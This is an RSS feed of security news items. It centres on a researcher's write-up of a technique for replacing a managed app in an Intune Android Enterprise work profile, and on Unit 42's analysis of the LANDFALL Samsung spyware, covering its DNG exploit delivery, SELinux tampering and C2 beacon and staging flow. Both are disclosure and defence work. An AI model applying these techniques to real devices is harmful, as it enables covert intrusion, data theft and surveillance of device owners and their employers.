API Key and go to Active Endpoints to view your available RPC URLs.You will see several links for different networks. The one we are looking for is Ethereum Sepolia.Step 9: Developing the Web InterfaceAt this point, we have most of the puzzle pieces:The only remaining part is to develop a web page to interact with the smart contract.Create a file named index.html. Paste the following code inside the file:Important: Replace the placeholders with your own values:YOUR_CONTRACT_ADDRESS_HERE → Smart contract addressYOUR_ABI_HERE → ABI JSON of your contractYOUR_INFURA_RPC_URL_HERE → Infura Sepolia RPC endpointThis simple web page allows users to click a button and fetch the message from the smart contract deployed on the blockchain.Step 10: Running the ProjectFinally, everything is ready to run our project.To avoid issues like Content Security Policies (CSP) when opening the HTML file directly in the browser, we’ll run a local server using Python.If you don’t have Python, you can also use alternatives like Live Server in VS Code, Node.js HTTP Server, or similar tools.Open a terminal in the project folder and run:python -m http.server 8000This will start a local web server on port 8000.Open your browser and go to:You should see your web page loaded.When you click the “Read Message” button, the page will fetch the message from the smart contract via the Infura RPC and display it on the screen.]]></content:encoded></item><item><title>Arbitrary App Installation on Intune Managed Android Enterprise BYOD in Work Profile</title><link>https://jgnr.ch/sites/android_enterprise.html</link><author>/u/Jessner10247</author><category>netsec</category><pubDate>Sat, 8 Nov 2025 13:57:20 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[ It's possible to install arbitrary apps in a provisioned Work Profile on a BYOD device with ADB and Android Studio after the patch of . 
			Due to a auto-install requirement in the Work Profile, which can be enforced via Intune, it is possible to convince the Play Store service (Finsky) to install an arbitrary app, with the same package name and a higher version number than the managed legit application. If a per-app VPN connection is configured via MS Tunnels and Defender application for the managed application, it is even possible to take over the VPN connection and have access to the internal systems.In June 2023, i had the chance to do some testing and research with Microsoft Intune and Android Enterprise in a (bring-your-own-device) BYOD scenario. Microsoft Intune is a cloud-based service that provides unified endpoint management, allowing organizations to manage and secure devices, applications, and data across various platforms, including Windows, macOS, iOS, and Android. Android Enterprise is a set of APIs and tools from Google that enables organizations to manage and secure Android devices for business use, allowing for the separation of work and personal data on a single device and providing granular control over apps and settings. The basic idea is to give the employees the opportunity to have business related apps with internal data on their phones, but in a secure way.During the analysis, we tested several vectors like if sharing data between private and work apps is enabled / possible, are screenshots enabled and stuff like that. We also noticed that some apps were required and auto downloaded due to company policies. Of course, this is all extremely dependant on the configuration of the respective policies pushed to the devices. Some not-so-interesting-compliance-checks-days later, we thought maybe it is possible to install arbitrary apps via ADB CLI. Since it is was private device (BYOD), the employee can activate the Developer Options options very easy.As we already knew, Android has multi user support and this is especially relevant for Work Profiles. Whenever a Work Profile is created on a device, an additional user is created with his own filesystem and relevant apps. This usually looks like this on a regular phone: main user is  and the Android Enterprise Work Profile user could be  (depending how many Work Profiles / other profiles were already created). This brings the advantage that the filesystem, system apps and everything relevant is absolutely isolated from one another. For useability and convenience reasons the Work Profile is then merged into the regular UI, as shown below: So we turned on the Developer settings and ADB on the phone tried to install an APK from our notebook via ADB CLI  and unfortunately it didnt work and was not installed. As we knew, the Work Profile has their own userid so we tried to install it via adb install --user 1 test.apk but this also did not work and we got a permission error.

			I can't really remember why (i think i got the hint from a stackoverflow article :D) but i then tried it to install a pretty basic self developed app with the package name  via Android Studio, with the configuration setting . Suprisingly, this worked. We had now an arbitrary app installed with our own package name in the private and the Work Profile. We added this finding to the report and wrapped it up.A couple of weeks later, in late August 2023, i wanted to come back to this problem, because i found it pretty weird that it wasn't possible to install arbitrary apps via ADB CLI, but it worked with Android Studio. So, i thought, maybe Android Studio sends some different ADB commands over USB or something. So, i set up an Intune trial tenant, created some policies according to the ones we saw in the engagement and created test users to login via the Company portal app on my test phone. I didn’t even get to the USB debugging part, because it did not work anymore.So, i debugged other things for several hours, tried several different apps and versions and could not figure out what was different than a couple of weeks ago. By suprise, i had a look at the Android Security Bulletin from July 2023 and saw a disclosed vulnerability which looked very suspiciously like a patch for our little party trick from June and my phone for testing was of course in auto-update mode.The patch had the following description:
[RESTRICT AUTOMERGE] Prevent installing apps in policy restricted work profile using ADB

If DISALLOW_DEBUGGING_FEATURES or DISALLOW_INSTALL_APPS restrictions are
set on a work profile, prevent side loading of APKs using ADB in the work profile.

			When i had closer look at the code, i wondered if it would be possible to install (update) an arbitrary app with the same package name as an already installed one. So i recreated the environment i had seen in June 2023, configured the Intune policies and added the  application to the required applications (automatic downloading and installing) of the group from my test user, because the seen environment from June 2023 also had this setting enabled. Some hours later and trying different things, i thought that it maybe should be possible to try and convince Android that my arbitrary app with the same package name as an already installed app, could be an update when the version number is higher than the actual one. 💡So i adjusted the  file of my sample app, with the assumption that the actual version name and version code of the application is  for example and the applicationId, namespace, packagename is known e.g. :
	[...]
	android {
	    namespace = "com.workday.workdroidapp"
	    compileSdk = 36

	    defaultConfig {
	        applicationId = "com.workday.workdroidapp"
	        minSdk = 31
	        targetSdk = 36
	        versionCode = 900000004
	        versionName = "9000000004.0"

	        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
	    }
	[...]
			When i checked that the setting to install for all users is still active and pressed the Debug button in Android Studio with the attached phone, i was immediatly greeted with the following notification:So i clicked  and immediatly saw the installation of my arbitrary app in the personal profile and the real Workday app, which we took the package name from for our arbitrary app, was deinstalled. I was a bit confused, because i actually thought after the error message it is not possible to update the legit app with my abitrary one and Android would just skip the installation to the Work Profile.I re-checked the company settings via Company Portal application on the phone and to my suprise, 1 minute later i saw a little notification from the Work Profile Play Store app (as i mentioned earlier, the work profile has their own set of system applications which are solely used for Work Profile stuff) that my application  has been successfully installed.At that point, i was totally confused. I repeated the steps several times, from uninstalling the work profile as a whole, reinstalling and onboarding via Company portal and then try to update the Workday app with my arbitrary one and it worked very reliable in 1-10min to replace the legit app with my arbitrary one, depending on the speed of which the policies and the missing required app (Workday) is checked and noticed on the device. I reread the patch from Android several times, and also checked the permission of the UserManager in the Work Profile, despite i just did a default configuration via Intune.So, I retested all of this in August 2025 with Android 16 (API Level 36) (Security Patch April 2025), as well as Android 13 (API Level 33) (Security Patch March 2024) and it still works. 

			
			  
			  
			  PoC with Android 13 (submitted to Android VRP with Security Patch August 2023):PoC with Android 16 (tested in August 2025 with Security Patch April 2025):So my idea why this whole chain worked was: When my arbitrary application is pushed to the device and to both users (private and work profile user) it gets installed for the private one, because there are no restrictions. For the Work Profile user, the APK gets pushed to the device into a temporary directory, then the check from the patch applies but fails because according to the usermanager object at least one of the flags DISALLOW_DEBUGGING_FEATURES or  is set for the Work Profile user and in parallel the legit app is deinstalled because it thinks it could be an update. At this point the legit app is deinstalled from the Work Profile. When then a recheck of the applied Intune policies via Company Portal is triggered, it also checks if all required apps are installed. When not, the Work Profile Play Store service (internal name Finsky) checks with Play Services online and also this temporary directory, compares the latest online version with the version in the temporary directory and if the temporary directory version is higher, then our arbitrary apps is installed. And most probably the Play Service does not check if the flags DISALLOW_DEBUGGING_FEATURES or  are set.So when i thought i had an idea why this happens and how it works, i was confident this could be a bypass for . So i opened an issue on the Google and Alphabet Vulnerability Reward Program (VRP) platform, documented everything and sent the bug report at end of August 2023.After a couple of weeks i got a response from Android VRP and with the answer that they consider this not as a vulnerability, the MDM needs to restrict this.In my opinion, the MDM does actually restrict this with the set flags (see pictures, left the private profile and right Work Profil) and the check also works, but there is most probably some sort of caching problem with the PlayStore service.Further Further Investigation - What could i do with my own app in a Work Profile?Besides the obvious, that usually sharing data between private and Work Profile is disabled, you have here a nice way to exfil data because you have now an application in the work context which you can share data to. Furthermore, there is also a setup i've seen in Intune with MS Tunnels, in which you can configure a per-app VPN. This means that a configured app on the device can connect via VPN to your network e.g. for an accounting application or internal employee directory. If you replace an application in the Work Profile with a configured per-app VPN setting with the party trick from above, it is also possible to use the VPN connection to the connected network with the arbitrary application.So of course, the prerequirements are very high, but if you're able to access someones BYOD device unlocked (Developer Settings need to be activated, otherwise you would need to know the device PIN/password to activate) you would be able to replace a legit business application with a malicous one for long-term access to company data. Additionally, if activated and if you are able to replace the correct one, you would also be able to pivot into the internal network via the per-app-VPN. To my current knowledge, the only setting that effectively mitigates this at the moment is disabling the automatic download and installation of apps (not configuring as ) in the Work Profile, but instead using available for enrolled devices setting. Other policies, such as disabling Developer Settings for all profiles or blocking installations from unknown sources, can be easily bypassed with proper timing. It it also questionable if employees would accept such a restriction on their private phone and in their private profile. Nonetheless the company tries to save money with not providing a dedicated work device and piggybacks the private ones.Let me know if you have additional ideas, then please ping me or let me know on X (https://x.com/joelgun)]]></content:encoded></item><item><title>NCCIA arrests man over massive data breach involving millions of Pakistanis</title><link>https://databreaches.net/2025/11/08/nccia-arrests-man-over-massive-data-breach-involving-millions-of-pakistanis/?pk_campaign=feed&amp;pk_kwd=nccia-arrests-man-over-massive-data-breach-involving-millions-of-pakistanis</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 8 Nov 2025 13:01:53 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Defense Contractors Are Silencing Their Cybersecurity Watchdogs</title><link>https://databreaches.net/2025/11/08/defense-contractors-are-silencing-their-cybersecurity-watchdogs/?pk_campaign=feed&amp;pk_kwd=defense-contractors-are-silencing-their-cybersecurity-watchdogs</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 8 Nov 2025 12:53:23 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Honeypot: Requests for (Code) Repositories, (Sat, Nov 8th)</title><link>https://isc.sans.edu/diary/rss/32460</link><author></author><category>threatintel</category><pubDate>Sat, 8 Nov 2025 06:09:22 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[This is just a quick diary entry to report that I saw requests on my honeypot for (code) repositories:]]></content:encoded></item><item><title>Another one of those!!</title><link>https://www.mergeconflictdigest.com/</link><author>/u/bi6o</author><category>netsec</category><pubDate>Sat, 8 Nov 2025 00:36:04 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[A free daily newsletter for ⚙️ Tech, 🤖 AI, 💻 Web Development, and more... 🚀]]></content:encoded></item><item><title>Fourth Circuit Weighs in on Standing in Data Breach Class Actions</title><link>https://databreaches.net/2025/11/07/fourth-circuit-weighs-in-on-standing-in-data-breach-class-actions/?pk_campaign=feed&amp;pk_kwd=fourth-circuit-weighs-in-on-standing-in-data-breach-class-actions</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 7 Nov 2025 23:31:00 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ALT5 Sigma sues former consultant over alleged data breach</title><link>https://databreaches.net/2025/11/07/alt5-sigma-sues-former-consultant-over-alleged-data-breach/?pk_campaign=feed&amp;pk_kwd=alt5-sigma-sues-former-consultant-over-alleged-data-breach</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 7 Nov 2025 23:00:44 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>New &apos;Landfall&apos; spyware exploited a Samsung 0-day delivered through WhatsApp messages</title><link>https://unit42.paloaltonetworks.com/landfall-is-new-commercial-grade-android-spyware/</link><author>/u/Megabeets</author><category>netsec</category><pubDate>Fri, 7 Nov 2025 22:15:51 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Unit 42 researchers have uncovered a previously unknown Android spyware family, which we have named LANDFALL. To deliver the spyware, attackers exploited a zero-day vulnerability (CVE-2025-21042) in Samsung’s Android image processing library. The specific flaw LANDFALL exploited, CVE-2025-21042, is not an isolated case but rather part of a broader pattern of similar issues found on multiple mobile platforms.This vulnerability was actively exploited in the wild before Samsung patched it in April 2025, following reports of in-the-wild attacks. However, the exploit itself — and the commercial-grade spyware used with it — have not yet been publicly reported and analyzed.LANDFALL was embedded in malicious image files (DNG file format) that appear to have been sent via WhatsApp. This method closely resembles an exploit chain involving Apple and WhatsApp that drew attention in August 2025. It also resembles an exploit chain that likely occurred using a similar zero-day vulnerability (CVE-2025-21043) disclosed in September. Our research did not identify any unknown vulnerabilities in WhatsApp.Importantly, our finding predates these disclosures — the LANDFALL campaign was already operating in mid-2024, using the zero-day Android/Samsung vulnerability (CVE-2025-21042) months before it was fixed.The vulnerability has been patched since April 2025, so there is no ongoing risk to current Samsung users. In September, Samsung also patched another zero-day vulnerability (CVE-2025-21043) in the same image processing library, further protecting against this type of attack.Our research looks back at historical exploitation that occurred before the patch, providing rare visibility into an advanced spyware operation that was publicly unreported.LANDFALL is Android spyware specifically designed against Samsung Galaxy devices, used in targeted intrusion activities within the Middle East.LANDFALL enabled comprehensive surveillance, including microphone recording, location tracking and collection of photos, contacts and call logs.The spyware is delivered through malformed DNG image files exploiting CVE-2025-21042 — a critical zero-day vulnerability in Samsung’s image processing library, which was exploited in the wild.The exploit chain possibly involved zero-click delivery using maliciously crafted images, similar to recent exploit chains seen on iOS and Samsung Galaxy.The campaign shares infrastructure and tradecraft patterns with commercial spyware operations in the Middle East, indicating possible links to private-sector offensive actors (PSOAs).LANDFALL remained active and undetected for months.Palo Alto Networks customers are better protected through the following products and services:LANDFALL Spyware DiscoveryIn mid-2025, following the public disclosure of an exploit chain targeting iOS devices, we searched for samples of the iOS exploit. This led to our discovery of the Android spyware that we called LANDFALL.Specifically, Unit 42 discovered several samples of DNG image files containing Android spyware used in an exploit chain targeting Samsung Galaxy devices. Our analysis confirmed these samples exploit CVE-2025-21042 to deliver LANDFALL, possibly via zero-click exploits on messaging applications.Beginning the Hunt: The iOS Exploit Chain and How It Made Us WonderIn August 2025, Apple issued OS security updates for its various products to address CVE-2025-43300, a zero-day vulnerability affecting DNG image parsing that attackers reportedly exploited in the wild.That same month, WhatsApp reported a zero-day vulnerability for CVE-2025-55177 that was chained with the image-processing vulnerability for Apple platforms in sophisticated attacks targeting iOS devices. The WhatsApp vulnerability allowed attackers to force devices to process content from arbitrary URLs.When the two vulnerabilities were combined in an exploit chain, this enabled zero-click remote code execution through maliciously crafted images sent via WhatsApp messages.Given the disclosure of this in-the-wild exploit chain and the absence of publicly available exploit samples, we initiated a hunt for this activity. Our search led to the discovery of several previously undetected DNG image files containing embedded Android spyware that were uploaded to VirusTotal throughout 2024 and early 2025.Judging by their filenames (e.g.,  and ), attackers likely delivered these samples via WhatsApp. Our analysis of the embedded spyware indicates it is designed for Samsung Galaxy devices.Malformed DNG Image Files: A New Attack Vector TrendOur analysis of LANDFALL spyware began with our discovery of malformed DNG image files. DNG stands for Digital Negative, and it is a raw image file format based on the TIFF image format. The malformed DNG image files we discovered have an embedded ZIP archive appended to the end of the file. Figure 1 shows one of these samples in a hex editor, indicating where the ZIP archive content begins near the end of the file.Our analysis indicates these DNG files exploit CVE-2025-21042, a vulnerability in Samsung's image-processing library  that Samsung patched in April 2025. The exploit extracts shared object library () files from the embedded ZIP archive to run LANDFALL spyware. Figure 2 below shows a flowchart for this spyware.Table 1 shows the DNG image samples we discovered.Filenames with strings like  and  imply attackers could have attempted to deliver the embedded Android spyware via WhatsApp. This matches earlier public reporting of similar DNG image-based exploitation through WhatsApp targeting Apple devices. Furthermore, WhatsApp researchers identified and reported a similar DNG vulnerability, CVE-2025-21043, to Samsung.Delivering LANDFALL Spyware: Mobile Device Malware Exploit ChainsTypically, mobile device malware distributed through exploits requires a chain of exploits across different vulnerabilities for successful infection. Various studies have documented cases of at least two vulnerabilities when distributing spyware, but modern exploit chains for spyware are far more complex [PDF], linking multiple vulnerabilities to compromise mobile devices and gain privileges.We have yet to discover any further exploits associated with this activity.LANDFALL Spyware AnalysisLANDFALL is Android spyware specifically designed for Samsung Galaxy devices, likely used in targeted intrusion activities within the Middle East. This modular spyware is engineered for espionage and data exfiltration.The infection chain for LANDFALL involves an exploit for CVE-2025-21042, a vulnerability in Samsung's image-processing library tracked by the vendor as Samsung Vulnerabilities and Exposures (SVE) designator SVE-2024-1969. We believe a full attack chain would follow a pattern of potential zero-click remote code execution, beginning with the delivery of the malformed DNG images.Two components of LANDFALL spyware are embedded within the malformed DNG images and would be extracted and executed, following a successful exploit:Loader (): An ARM64 ELF shared object (106 KB, stripped and dynamically linked) that serves as the main backdoor.SELinux Policy Manipulator (): Extracted from an XZ-compressed ELF binary, this component is designed to manipulate the device's SELinux policy to grant LANDFALL elevated permissions and aid persistence. (See Appendix A - SELinux Policy Manipulation.)Table 2 shows the LANDFALL component files embedded within the malicious DNG samples.Our analysis indicates LANDFALL is multi-component Android spyware designed for monitoring and data exfiltration.Our analysis focuses on the  component, which serves as the initial loader for a broader LANDFALL framework. In its own debug artifacts, the component refers to itself as “Bridge Head.” This will be of interest later when we discuss possible relationships between LANDFALL and known spyware groups.LANDFALL’s Potential CapabilitiesThe  component of LANDFALL contains numerous debug and status strings, but it does not contain the logic that actually references most of these strings. This suggests that  would download additional components for these capabilities. Our analysis of embedded command strings and execution paths within the  file provides insight into the broader LANDFALL's potential capabilities.Taking inventory of installed applicationsAccessing location servicesDatabases on the device (browsing history, etc.)Execution, Loading and PersistenceLoading native shared object () modulesLoading and executing DEX files from memory and diskExecuting arbitrary commandsModifying SELinux policy via compressed binaryMonitoring WhatsApp Media directory for additional payloadsRegistering WhatsApp web clientManipulating the file system in Android app directoriesManipulating the file systemEvasion and Defense AvoidanceDetecting TracerPid debuggerDetecting Frida instrumentation frameworkDetecting Xposed frameworkDynamic library loading with namespace manipulationCertificate pinning for C2 communicationsCleaning up WhatsApp images payloadGalaxy S23 Series (S91[168]BXX.*)Galaxy S24 Series (S921BXXU1AWM9, S92[168]BXX.*)Galaxy Z Fold4 (F936BXXS4DWJ1)Galaxy S22 (S901EXXS4CWD1)Galaxy Z Flip4 (F721BXXU1CWAC)Figure 3 shows an example of the targeted device model strings in a  sample of LANDFALL.The  component of LANDFALL communicates with its C2 server over HTTPS using a non-standard, ephemeral TCP port. Before the HTTPS traffic, it can initiate ping traffic as detailed in the Communication With the C2 Server section of Appendix B. For HTTPS traffic,  initiates contact with a POST request containing detailed device and spyware information, such as:Figure 4 shows an interpretation of this initial POST request, where we use  to show how this request would be structured. Of note, LANDFALL does not use  to generate this traffic.The initial beacon traffic is an HTTP POST request to the C2 server with the following parameters:: The protocol version (e.g., ): The protocol version (e.g., ""): The message type (e.g., ): The agent's unique identifier: An upload identifier: A command identifier: The source of the request (e.g., ): The incremental build version (e.g., ): The effective user ID of the process: The path to the  binary on the device: The runner mode (e.g., )Configuration of b.so FileThe  file's configuration is managed through a combination of hard-coded default values and an encrypted JSON object embedded within itself. This configuration includes C2 details, cryptographic keys and unique identifiers for the agent and commands.Figure 5 shows an example of this configuration.This  component of LANDFALL also contains a number of hard-coded configuration values. These are used as default values if they are not provided in the encrypted JSON object. We do not yet fully understand the purpose of some of these values. Table 3 shows these hard-coded default configuration values.C2 Infrastructure for LANDFALL SpywareBased on our analysis of these samples, we identified six C2 servers for LANDFALL, shown below in Table 4.How LANDFALL Fits Into the Larger PictureLANDFALL is one example of a larger pattern of exploit chains affecting mobile devices, related to DNG image processing vulnerabilities.The LANDFALL campaign's use of a malformed DNG file highlights a significant, recurring attack vector: the targeting of vulnerabilities within DNG image processing libraries. The specific flaw LANDFALL exploited, CVE-2025-21042, is not an isolated case but rather part of a broader pattern of similar issues found on multiple mobile platforms. In fact, earlier in 2025, Samsung identified another DNG flaw in the same Samsung library, CVE-2025-21043, and the parallel exploit chain on iOS was identified that leveraged CVE-2025-43300 in Apple iOS and CVE-2025-55177 in WhatsApp.Relationship to CVE-2025-21043 (SVE-2025-1702)Our analysis revealed a possible connection to a separate vulnerability in the same library, CVE-2025-21043 (SVE-2025-1702), which Samsung patched in its September 2025 security update. While it was not exploited in the LANDFALL samples we discovered, the similarities between the exploit for LANDFALL (CVE-2025-21042) and this vulnerability (CVE-2025-21043) are striking. Both vulnerabilities were publicly disclosed around the same time and both are connected to DNG image file processing delivered through mobile communication applications.In August 2025, Apple addressed CVE-2025-43300, a zero-day vulnerability impacting DNG image parsing, which was actively exploited in the wild, to enable zero-click remote code execution through malicious images sent via mobile communication applications.We cannot confirm whether this chain was used to deliver an equivalent of LANDFALL to iOS, or whether it is the same threat actor behind the two. However, this parallel development in the iOS ecosystem, combined with the disclosure of the Samsung and Apple vulnerabilities just a few weeks apart, highlights a broader pattern of DNG image processing vulnerabilities being leveraged in sophisticated mobile spyware attacks.July 2024 – February 2025: Initial samples of malicious DNG image files carrying LANDFALL are first submitted on VirusTotal in July 2024, with additional samples appearing periodically over the next several months.
The DNG files exploit a vulnerability in Samsung’s Android image processing library (SVE-2024-1969, CVE-2025-21042)Samsung issues a firmware update to address the vulnerability, SVE-2024-1969, later known as CVE-2025-21042 when publicly disclosed. Parallel developments occur.
Apple patches a zero-day vulnerability impacting DNG image parsing, which was actively exploited in the wild (CVE-2025-43300)WhatsApp discloses a vulnerability (CVE-2025-55177) that was chained with Apple’s DNG image parsing zero-day vulnerability (CVE-2025-43300)We discovered DNG image files exploiting CVE-2025-21042 to deliver Android spyware that we identified as LANDFALL.WhatsApp disclosed to Samsung CVE-2025-21043 — another DNG-related zero-day vulnerability in Samsung Galaxy devices. Samsung issues mobile device firmware updates for CVE-2025-21043 (SVE-2025-1702). Concurrently, it assigns CVE-2025-21042 (SVE-20254-1969) to the earlier vulnerability that previously had no CVE designator.Analysis of VirusTotal submission data for the malicious DNG files indicates potential targets in Iraq, Iran, Turkey and Morocco.Relationship to Known Spyware GroupsWhile we were unable to recover every component of the LANDFALL framework, it is clear that the tool is commercial grade. It may have utilized several zero-day exploits in its infection chain.Such tools are often developed and sold as commercial spyware and attributed to groups known as private sector offensive actors (PSOAs), who are often legitimate legal entities. Reportedly, these groups provide services to government entities.We were not able at this time to officially attribute LANDFALL activity to a known PSOA or threat actor. Unit 42 tracks the activity related to CVE-2025-21042 and LANDFALL as CL-UNK-1054.Two aspects are notable and worth highlighting.First, LANDFALL's C2 infrastructure and domain registration patterns share similarities to infrastructure associated with Stealth Falcon as observed by Unit 42. These similarities are based on various publicreports, as well as Stealth Falcon activity we have analyzed for targets in the Middle East.Second, in its own debug artifacts, the spyware component we analyzed refers to itself as “Bridge Head.” Of note, the term Bridge Head is a common nickname used by some private-sector offensive cyber companies (including NSO, Variston [PDF], Cytrox and Quadream) for first-stage loaders. However, this naming convention alone does not constitute a direct attribution link.While this is a common name used in commercial mobile spyware to describe loaders, it draws similarities to the Heliconica framework. This framework also contains references to “BridgeHead,” as Google TAG reported about spyware vendor Variston. Google identified Variston as a Barcelona-based PSOA (provider of exploits). Further analysis from Google and other reports indicated Variston's tooling was supplied to clients in the UAE through a reseller named Protect Electronic Systems (or Protected AE).This potential provider-client link to the UAE is noteworthy, as Microsoft and others reported that Stealth Falcon also operates heavily out of that country. Variston reportedly ceased operations in early 2025 following its public exposure.As of October 2025, except in infrastructure, we have not observed direct overlaps between the mobile campaigns of LANDFALL and the endpoint-based activity from Stealth Falcon, nor direct strong links with Stealth Falcon. However, the similarities are worth discussion.The discovery of LANDFALL spyware reveals a campaign targeting Samsung Android devices. The exploit chain involves CVE-2025-21042, a vulnerability that was patched by Samsung in April 2025. The presence of this spyware within DNG image files with WhatsApp-related naming conventions likely indicates attackers attempted to deliver the exploit through a messaging application.From the initial appearance of samples in July 2024, this activity highlights how sophisticated exploits can remain in public repositories for an extended period before being fully understood.The analysis of the loader reveals evidence of commercial-grade activity. The LANDFALL spyware components suggest advanced capabilities for stealth, persistence and comprehensive data collection from modern Samsung devices.However, we have not directly analyzed the next-stage components of the spyware. Additional details on this or on the exact delivery method would provide even more insight into the malicious activity.Palo Alto Networks customers are better protected from LANDFALL Android spyware through the following products:North America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42)Europe and Middle East: +31.20.299.3130Australia: +61.2.4062.7950Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.

This file provides a capability to bypass system security controls. It is decompressed from  to  and executed.Rather than containing hard-coded rules,  implements a generic engine that can dynamically parse and load new SELinux policy statements from an external source, modifying the running policy in memory.Relevant and unique exported functions:: Load policy from binary data: Add individual policy statements: Serialize modified policy: Clean up policy objectsAppendix B: Additional Details on LANDFALL Spyware AnalysisThis appendix details the observed capabilities of the loader component of LANDFALL, as well as those we infer exist in other modules of the complete LANDFALL framework that we have not yet accessed.LANDFALL’s Bridge Head, named on the disk as , is loaded by an exploit on the device. Immediately after being loaded post‑exploit, LANDFALL parses  from the environment to avoid inheriting upstream preloads. It reads the effective user ID via  and stores it globally so later branches can adjust behavior for root versus non‑root. Then it calls into the main routine.It gathers process basics (parent , , Android build string), reads a  flag from the environment variable  and takes a copy of it for later actions. This value (typically  for interactive or  for passive) will be reported to the command and control and determine how it launches a later staged payload. It resolves its own mapped path, selects the app-private base at  as its working directory and then constructs two child paths there. One path is for the staged download and one is for the final  used for execution.LANDFALL reads and XOR-decrypts a JSON configuration directly from its own file. The spyware normalizes configuration by writing internal defaults back into the parsed object: numeric fields default when missing or zero, and certain booleans are coerced to fixed values regardless of the supplied configuration. Finally, it checks that a public key (X.509 DER) is present in the configuration and exits otherwise.Table 8 summarizes the configuration normalization performed at this stage.Communication With the C2 ServerOnce configuration is complete,  loads the necessary network and encryption functions, sets up its SSL environment, and prepares a secure client context for future HTTPS communication. If any part of this setup fails, it exits cleanly rather than risk a partial setup.Before entering the C2 beaconing loop, it optionally emits telemetry. If it is running as root, it formats a concise "started" line that includes:A fixed version marker (e.g., )It then sends that via a POST request to the C2 server, as shown below.If the runner mode is , it prepares the SELinux helper first: it locates the compressed policy helper (), inflates it via an internal XZ decoder into a fresh buffer, and writes the result to . Then it beacons to the C2 server by sending ping using the hyphen‑stripped  as payload. The outcome doesn’t gate the rest of the flow, and it serves as an operator telemetry.An example of code for an ‑mode  follows.Only then does the main C2 beaconing loop begin. It records time zero and enforces a strict wall‑clock budget of about 7,200 seconds () for the entire session.It zeros two large, reusable path buffers: one for the raw blob that may arrive from the server, and a sibling for the decompressed shared object. Both paths live under the app‑private working directory (e.g., ). With the paths ready, it contacts the command and control server by building a compact, URL‑encoded style body of  pairs:A protocol/variant tag; the beacon message typeThe ,  and a fresh  (UUIDv4) for correlationThe runner flag and its on‑disk install pathWhen applicable, it computes a SHA-1 over part of the message and appends it. It uses the following Chrome User‑Agent string:Requests are directed at the configured base path (e.g., ). Before any application data is sent, it pins the TLS connection.While reading the response from the C2 server, LANDFALL checks the response status code and looks through the headers to determine the message length and type. Some status codes — particularly timeouts and a masked set of / (e.g., , ) — are treated as transient and trigger  (default 35 seconds) before retrying with a fresh connection. A not‑found response (e.g., ) is considered terminal for this run and exits the loop. If the status indicates success and a body is present, LANDFALL proceeds to staging.Staging starts by cleaning up the file system state. If an old raw blob exists at the temporary path, it removes it. It writes the raw bytes to a staging file named  under the working directory, and then, attempts to decompress them using a built‑in XZ/LZMA decoder that inflates into a pre‑allocated approximately 5 MiB buffer.On success, it writes the decompressed bytes to  (the final  path) under the working directory, clears the temporary  and sets the file mode on  to  to ensure it’s loadable in various contexts.Example XZ inflater (trimmed):With the shared object in place (), it chooses an execution strategy based on the runner flag. For interactive setups (), it exports two environment variables and launches a benign system tool synchronously:The  points at the device path where SELinux policy content is expected, allowing the preloaded code to find and apply policy at startup. Note that this  is only used in interactive mode, the passive running path omits it.For passive runs (), it launches the same tool in the background:This is done so control returns quickly while the helper initializes in another process. Internally, both are dispatched via a shell wrapper (). In both cases, it accepts only narrow success results:exit code 0 or a specific ; anything else is treated as failure and breaks out of the loopOn successful load, it formats and sends an “ended” line mirroring the opening message including:It then frees transient strings and buffers. If no payload was available, or if a transient error occurred, it checks the elapsed wall‑clock time against its approximately 7,200‑second budget. If there’s time left, it sleeps the configured interval and tries again.Finally, when the loop finishes, either after a successful loading of the next stage or due to time budget or unrecoverable errors, it unwinds cleanly. If it is running as root, it prefers a  path instead of a normal return to minimize side effects in the runtime. In all cases, it aims to leave behind only the minimum artifacts needed for the staged code to continue.Unreferenced CapabilitiesDuring reverse engineering, we identified multiple routines compiled into the  component that are not invoked by its observed control flow. These latent features appear designed for use by the follow‑on modules loaded.It is also very probable that some of these functions are leftovers from older versions of LANDFALL. They reveal concrete behaviors oriented around WhatsApp media paths, DCIM discovery, file system staging and process hygiene on Android:One routine prepares a “started” telemetry line and then interacts with the device’s media subsystem. It formats the line:
If its internal checks pass, it executes a broadcast to force a gallery rescan using the exact shell:
In the same flow, it also constructs a “newest photo” probe over DCIM using:
This pattern is consistent with harvesting the latest camera item while excluding an artifact it can plant. This routine is compiled in but not called by any other code in the sample.WhatsApp media path planter. Another routine decodes a hard-coded Base64 1x1 PNG () and searches WhatsApp’s media directories on external storage for a recent file path that matches the agent’s identifier (the UUID is first stripped of hyphens). It builds and executes a search pipeline across both default (ID 0) and multi‑user (ID 95) paths:
.If such a path is returned, it writes the decoded PNG there verbatim. This looks like a cover‑artifact or covert marker stage aimed at WhatsApp images.Another helper takes a base directory and a string and returns one matching JPEG path by executing:
It trims trailing newlines and verifies the path exists before returning.Zygote avoidance check: A process‑hygiene helper allocates a buffer for its own  and returns success only when the name does not match  or . It is designed to avoid Android’s special host processes.SELinux symbol resolver and cleanup: Two small routines handle dynamic SELinux plumbing.
